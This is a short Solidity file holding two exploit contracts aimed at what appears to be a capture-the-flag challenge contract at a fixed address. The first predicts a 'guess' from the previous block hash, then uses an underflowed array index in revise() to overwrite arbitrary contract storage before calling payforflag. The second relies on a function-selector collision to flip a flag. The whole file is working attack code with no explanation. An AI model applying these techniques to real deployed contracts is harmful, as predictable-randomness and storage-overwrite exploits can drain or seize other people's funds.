pragma solidity ^0.4.26;

interface PFF {
    function payforflag(string) external;
}

contract exp1 {
    // require address & 0x0fff == 0x0111;
    // event log(uint256);
    address task = 0x168892cb672A747F193eb4acA7b964bfb0aA6476;
    constructor (uint256 idx, uint256 data) public {
        task.call(bytes4(keccak256("gift()")));
        uint256 guess = uint256(block.blockhash((block.number - 1))) % 3;
        task.call(bytes4(keccak256("guess(uint256)")), guess);
        task.call(bytes4(keccak256("buy()")));
        task.call(bytes4(keccak256("retract()")));
        task.call(bytes4(keccak256("revise(uint256,bytes32)")), idx-uint256(keccak256(uint256(1))), bytes32(data));
    }

    function pff() public {
        PFF(task).payforflag("payforflagtest");
    }
}

contract exp2 {
    // makes bool2 true
    // don't forget to change function digest a8286aca
    uint256 i = 1;
    address task = 0x168892cb672A747F193eb4acA7b964bfb0aA6476;
    function change_to_a8286aca(uint256) public view returns(uint256) {
        i += 1;
        return i%2;
    }
    function hack() {
        task.call(bytes4(0x23de8635), 0);
    }
}
